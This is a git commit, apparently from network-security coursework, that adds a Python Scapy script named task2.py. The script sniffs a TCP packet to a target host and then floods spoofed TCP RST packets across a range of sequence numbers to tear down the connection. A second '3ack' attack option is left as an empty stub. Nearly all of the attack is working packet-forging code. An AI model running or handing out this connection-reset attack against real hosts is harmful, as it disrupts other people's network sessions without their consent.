34c81aac9eee244bc4e5124e5ef4317bb190976f
Kevork <kevorkchristian@gmail.com>
2022-10-28 16:43:39 +0200

    started working on task 2

---
+++ task2.py
@@ -0,0 +1,55 @@
+import sys
+
+import scapy.all as scapy
+scapy.conf.use_pcap = True
+
+if __name__ == "__main__":
+
+    argc = len(sys.argv)
+
+    if argc != 5:
+
+        print("Usage: python3 task2.py <source_addr> <dest_addr> <dest_port> <attack>", file=sys.stderr)
+
+        sys.exit(1)
+
+    source_addr = sys.argv[1]
+    dest_addr = sys.argv[2]
+    dest_port = int(sys.argv[3])
+    attack = sys.argv[4]
+
+    if attack.lower() == "rst":
+        # Creating a tcpserver socket
+
+        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        # Binding the socket to a public host, and a well-known port
+
+        #s.connect((dest_addr, dest_port))
+
+        # Send tcp RST packet using scapy
+
+        print("Assuming this is blocking")
+        capture = scapy.sniff(filter="tcp and host " + dest_addr, count=1)
+        print("Captured packet")
+        capture.summary()
+        # Extract TCP sequence number from the captured packet
+        seq = capture[0].seq
+        # Get the captured packet's source port
+        sport = capture[0].sport
+
+        for i in range(seq, seq + 10000000, 10000):
+            # Create a TCP packet with RST flag set
+            rst = scapy.IP(src=source_addr, dst=dest_addr)/scapy.TCP(sport=sport, dport=dest_port, flags="R", seq=i)
+            
+            # Send the packet
+            scapy.send(rst)
+            print("Sent packet with seq: " + str(i))
+
+
+        # p = scapy.IP(src=source_addr, dst=dest_addr)/scapy.TCP(sport=dest_port, dport=dest_port, flags="R", seq=seq+5000)
+        # print(p.show())
+        # scapy.send(p)
+
+    elif attack.lower() == "3ack":
+        pass
